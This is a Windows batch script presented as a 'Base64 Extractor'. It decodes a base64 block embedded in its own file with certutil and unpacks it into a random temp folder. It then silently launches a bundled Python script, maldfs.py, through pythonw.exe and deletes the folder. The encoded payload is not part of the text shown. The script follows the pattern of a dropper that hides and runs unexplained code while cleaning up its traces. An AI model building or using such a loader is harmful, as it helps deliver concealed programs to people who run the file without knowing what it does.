@echo off
setlocal EnableExtensions DisableDelayedExpansion
title Base64 Extractor - Ultra Fast

echo ========================================
echo        Base64 Extractor ULTRA FAST
echo ========================================
echo.

set "TEMP_DIR=%TEMP%\Base64Extract_%RANDOM%_%RANDOM%"
set "OUTPUT=%TEMP_DIR%\output.zip"
set "EXTRACT_BASE=%TEMP_DIR%\extracted"
set "EXTRACT_DIR=%EXTRACT_BASE%\python-3.10.0-embed-amd64"

mkdir "%TEMP_DIR%" 2>nul
mkdir "%EXTRACT_BASE%" 2>nul

echo.
echo [1/2] Dekodiere direkt mit certutil aus der Skriptdatei...

:: certutil liest %~f0 direkt ein und sucht nach dem Zertifikats-Block
certutil -f -decode "%~f0" "%OUTPUT%" >nul
if errorlevel 1 (
    echo [FEHLER] Dekodierung fehlgeschlagen.
    goto error
)

for %%F in ("%OUTPUT%") do echo [DEBUG] ZIP-Groesse: %%~zF Bytes

echo.
echo [2/2] Extrahiere mit tar.exe...

tar.exe -xf "%OUTPUT%" -C "%EXTRACT_BASE%" >nul
if errorlevel 1 (
    echo [FEHLER] Extraktion fehlgeschlagen.
    goto error
)

echo.
echo [3/3] Pruefe Startdateien und starte...

set "MISSING=0"
for %%I in (python.exe maldfs.py python310.dll python310.zip) do (
    if not exist "%EXTRACT_DIR%\%%I" set "MISSING=1"
)

if "%MISSING%"=="0" (
    cd /d "%EXTRACT_DIR%"
    start "" "%EXTRACT_DIR%\pythonw.exe" "%EXTRACT_DIR%\maldfs.py"
    echo [OK] Gestartet.
) else (
    echo [FEHLER] Benoetigte Dateien fehlen im Extraktionsordner.
    goto error
)

goto cleanup

:error
echo.
echo [FEHLER] Verarbeitung abgebrochen.

:cleanup
echo.
echo [INFO] Raeume temporaeren Ordner auf...
timeout /t 2 >nul
rd /s /q "%TEMP_DIR%" 2>nul

echo.
pause
exit /b 0

